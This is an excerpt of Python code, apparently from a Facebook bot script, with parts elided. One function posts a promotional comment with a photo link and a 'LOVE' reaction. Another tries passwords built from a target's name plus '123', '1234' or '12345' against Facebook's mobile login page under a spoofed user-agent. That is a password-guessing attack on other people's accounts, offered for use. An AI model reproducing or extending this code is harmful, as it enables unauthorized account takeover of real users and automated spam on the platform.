...
def bot_komen():
    ...
    kom2 = ('KEREN BANG 😘😘\nhttps://m.facebook.com/photo.php?fbid=01110619372783836&set=a.106868716492245&type=3&app=fbl') 
    reac = ('LOVE') 
	...
	def main(user):
		...
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345']:
				rex = requests.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
